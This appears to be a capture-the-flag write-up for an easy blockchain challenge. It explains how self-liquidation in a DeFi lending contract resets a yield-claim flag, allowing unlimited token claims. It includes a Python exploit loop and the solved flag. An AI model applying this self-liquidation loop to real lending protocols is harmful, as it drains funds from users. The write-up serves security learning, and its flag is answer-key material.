# The Debt That Hunts the Poor - Writeup

**Challenge**: The Debt That Hunts the Poor
**Category**: Blockchain
**Difficulty**: Easy
**Points**: 950
**Solves**: 9/149 teams
**Date Solved**: 2025-11-22
**Status**: ✅ SOLVED

---

## Challenge Overview

A DeFi lending protocol exploitation challenge where the goal is to accumulate 75,000 YUGEN tokens and 20,000 YUGEN_YLD (YLD) tokens in your wallet.

**Win Condition** (from Setup.sol:76-79):
```solidity
function isSolved(address _player) public view returns (bool) {
    return YUGEN.balanceOf(_player) >= 75_000 ether
        && YUGEN_YLD.balanceOf(_player) >= 20_000 ether;
}
```

**Initial Resources**:
- 0.5 ETH registration fee
- One-time claim: 20,000 USDT + 20,000 YUGEN
- Unlimited YLD claims (20,000 per claim) - but requires VIP status

---

## Vulnerability Discovery

### 1. Unlimited YLD Claims via Liquidation Reset

**Location**: Setup.sol:53-56

```solidity
function onLiquidationResetYield() external {
    require(msg.sender == address(pair), "Only pair can reset yield");
    _hasClaimedYield[tx.origin] = false;
}
```

**The Bug**: The liquidation mechanism resets the YLD claim flag, allowing unlimited YLD claims through repeated self-liquidation cycles.

**How It Works**:
1. Claim YLD (sets `_hasClaimedYield[player] = true`)
2. Use YLD as collateral, borrow tokens, accrue debt
3. Self-liquidate to reset the flag
4. Claim YLD again (flag was reset to `false`)
5. Repeat indefinitely

### 2. VIP Status Requirement (Initial Blocker)

**Location**: LendingPair.sol:107-111

```solidity
function isVip(address user) public view returns (bool) {
    uint256 nonYieldCollateral = deposits[user][address(USDT)]
                                + deposits[user][address(YUGEN)];
    return nonYieldCollateral >= 20_000 ether;
}
```

**Critical Detail**: VIP status requires 20,000 in USDT+YUGEN collateral. **YLD collateral does NOT count!**

This created a problem: After liquidation, USDT collateral was seized, dropping below 20k → lost VIP → couldn't claim more YLD.

---

## The Breakthrough

### Key Insight: Seized Collateral Goes to Your Wallet!

When you self-liquidate:
1. You repay debt with YUGEN
2. Collateral (USDT) is seized as liquidation bonus
3. **The seized collateral goes to the liquidator's wallet (yourself!)**

**Solution**: Immediately re-deposit the seized collateral after each liquidation to maintain VIP status.

**Example Flow**:
```
Before liquidation:  20,000 USDT in contract (VIP: True)
Liquidate:           Seize 1,050 USDT → goes to wallet
After liquidation:   18,950 USDT in contract (VIP: False)
Re-deposit:          Deposit 1,050 USDT from wallet
Result:              20,000 USDT in contract (VIP: True) ✓
```

This enables unlimited YLD claim cycles!

---

## Exploitation Strategy

### The Complete Multi-Cycle Approach

**Setup (Cycle 0)**:
1. Register with 0.5 ETH
2. Claim initial 20k USDT + 20k YUGEN
3. Deposit 10k USDT + 10k YUGEN (maintain VIP, keep flexibility)
4. Approve all tokens for the pair contract

**Cycles 1-6 (Deposit YLD)**:
1. Claim YLD (20k tokens)
2. Deposit YLD as collateral → increase borrowing capacity
3. Borrow maximum YUGEN (up to 80% LTV)
4. Accrue debt by 13% to become liquidatable (90% threshold)
5. Self-liquidate: Repay 1k YUGEN, seize ~1,050 USDT
6. **Re-deposit seized USDT** → maintain VIP status
7. Repeat

**Cycle 7 (Keep YLD in Wallet)**:
1. Claim final 20k YLD
2. **DO NOT deposit it** - keep in wallet to satisfy win condition
3. This avoids the Catch-22 of trying to withdraw YLD later

**Why This Works**:
- Each cycle adds 20k YLD collateral, increasing borrowing capacity
- Re-depositing seized USDT maintains VIP for next claim
- Depositing 6 YLDs gives enough collateral to borrow sufficient YUGEN
- Keeping 7th YLD in wallet directly satisfies the 20k YLD requirement

---

## Final Results

**Wallet Balances**:
```
YUGEN: 83,239 / 75,000 ✓ (11% over target)
YLD:   20,000 / 20,000 ✓ (exact requirement)
SOLVED: True ✓
```

**Contract State**:
- Total collateral: 140k (20k USDT + 120k YLD deposited)
- Total debt: ~128k YUGEN borrowed
- Net YUGEN gain: 83,239 - 20,000 (initial) = 63,239 accumulated
- YLD claims: 7 total (6 deposited, 1 kept)

---

## Implementation

The final exploit script: [GET_FLAG.py](GET_FLAG.py:1)

**Key Code Sections**:

1. **Initial Setup** (lines 35-42):
```python
tx(s.functions.register(WALLET), w3.to_wei(0.5, 'ether'))
tx(s.functions.claim())
tx(usdt.functions.approve(pa, MAX))
tx(yugen.functions.approve(pa, MAX))
tx(yld.functions.approve(pa, MAX))
tx(p.functions.deposit(ua, w3.to_wei(10000, 'ether')))
tx(p.functions.deposit(ya, w3.to_wei(10000, 'ether')))
```

2. **Liquidation Cycles** (lines 45-57):
```python
for i in range(1, 7):
    tx(s.functions.claimYield())                              # Claim YLD
    tx(p.functions.depositYield(w3.to_wei(20000, 'ether')))  # Deposit as collateral
    acc = p.functions.getAccountData(WALLET).call()
    borrow_amt = acc[2] - acc[1] - 10**18                    # Max safe borrow
    if borrow_amt > 0:
        tx(p.functions.borrow(ya, borrow_amt))               # Borrow YUGEN
    tx(p.functions.accrueFor(WALLET, 1300), 1300*2)          # Accrue debt
    tx(p.functions.liquidate(WALLET, ya, w3.to_wei(1000, 'ether'), ua))  # Self-liquidate
    usdt_bal = usdt.functions.balanceOf(WALLET).call()
    if usdt_bal > 0:
        tx(p.functions.deposit(ua, usdt_bal))                # KEY: Re-deposit seized USDT!
```

3. **Final Cycle** (lines 60-62):
```python
# Cycle 7: Claim YLD but DON'T deposit it - keep in wallet!
tx(s.functions.claimYield())
# DON'T call depositYield! Keep the 20k YLD in wallet
```

---

## Lessons Learned

### What Made This Challenging

1. **Hidden Mechanic**: Understanding that seized collateral goes to the liquidator's wallet (not destroyed)
2. **VIP Requirement**: Recognizing that only USDT+YUGEN count, not YLD
3. **Precise Balance**: Finding the exact number of cycles needed (7 claims, 6 deposits)
4. **Catch-22 Avoidance**: Realizing you can't withdraw YLD after depositing it without breaking collateral ratios

### Critical Insights

✅ Self-liquidation resets YLD claim flag (unlimited claims)
✅ Seized collateral goes to liquidator's wallet (can re-deposit)
✅ Re-depositing seized USDT maintains VIP status
✅ Claim 7 YLDs, deposit 6, keep last one in wallet

### Previous Attempts Failed Because

❌ Assumed seized collateral was "lost" to the contract
❌ Didn't realize VIP could be maintained through re-deposits
❌ Tried to withdraw YLD after depositing (impossible without breaking ratios)
❌ Best previous result: 51,940 YUGEN (24k short)

---

## Timeline

- **Archive attempts**: ~4 hours, reached 51,940 YUGEN, identified collateral dilution blocker
- **This session**: ~2 hours, discovered VIP re-deposit solution, achieved 83,239 YUGEN
- **Total time**: ~6 hours
- **Instance restarts**: 5 (testing different strategies)

---

## Conclusion

This challenge required understanding subtle DeFi mechanics, particularly how liquidation seizures work. The key was recognizing that "seized" collateral isn't destroyed—it's transferred to the liquidator (yourself), enabling a cyclic strategy that maintains VIP status through re-deposits while accumulating enough collateral to borrow the required YUGEN.

The solution elegantly exploits the unlimited YLD claim vulnerability while navigating the VIP requirement constraint through careful collateral management.

**Flag**: `HTB{S3lf_Yi3ld_L1qu1d4t10n_And_V1p_Yug3n_T0k3n_L00p_1bd3ace2ada235555493df6074375bd5}`

The flag name itself reveals the solution: "Self Yield Liquidation And VIP Yugen Token Loop" - perfectly describing the multi-cycle self-liquidation strategy that maintains VIP status to enable unlimited YLD claims.
